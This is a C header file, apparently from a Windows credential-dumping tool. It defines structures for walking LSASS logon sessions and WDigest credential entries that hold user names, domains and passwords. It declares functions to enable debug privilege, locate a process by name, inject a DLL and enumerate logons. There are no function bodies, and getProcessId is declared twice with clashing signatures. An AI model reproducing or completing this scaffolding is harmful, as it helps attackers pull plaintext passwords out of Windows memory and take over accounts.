#ifndef _USE_YOLO_H
#define _USE_YOLO_H

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LOGON {
	PUNICODE_STRING UserName;
	PUNICODE_STRING Password;
} LOGON, *PLOGON;

BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege);
int getDebugPrivilege();
DWORD getProcessId(char *processName, HMODULE *hModule);
void print_buffer(BYTE *buffer, SIZE_T size);
int getLogons(PLOGON logons, SIZE_T max);



typedef struct _LSA_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} LSA_STRING, *PLSA_STRING;

typedef LONG KPRIORITY;
typedef LSA_STRING STRING, *PSTRING;
typedef STRING ANSI_STRING;



typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
} PROCESSINFOCLASS;

typedef struct _LSASS_ENUM_HELPER {
	SIZE_T tailleStruct;
	ULONG offsetToLuid;
	ULONG offsetToLogonType;
	ULONG offsetToSession;
	ULONG offsetToUsername;
	ULONG offsetToDomain;
	ULONG offsetToCredentials;
	ULONG offsetToPSid;
	ULONG offsetToCredentialManager;
	ULONG offsetToLogonTime;
	ULONG offsetToLogonServer;
} LSASS_ENUM_HELPER, *PLSASS_ENUM_HELPER;

typedef struct _WDIGEST_LIST_ENTRY {
	struct _WDIGEST_LIST_ENTRY *Flink;
	struct _WDIGEST_LIST_ENTRY *Blink;
	ULONG	UsageCount;
	struct _WDIGEST_LIST_ENTRY *This;
	LUID LocallyUniqueIdentifier;
} WDIGEST_LIST_ENTRY, *PWDIGEST_LIST_ENTRY;

typedef struct _WDIGEST_PRIMARY_CREDENTIAL
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	LSA_UNICODE_STRING Password;
} WDIGEST_PRIMARY_CREDENTIAL, *PWDIGEST_PRIMARY_CREDENTIAL;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModulevector;
	LIST_ENTRY InMemoryOrderModulevector;
	LIST_ENTRY InInitializationOrderModulevector;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	struct BitField {
		BYTE ImageUsesLargePages : 1;
		BYTE SpareBits : 7;
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
	LONG ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;



int injectDll();
DWORD getProcessId(char *processName);
void setLogFile();
void setLogFileService();

#endif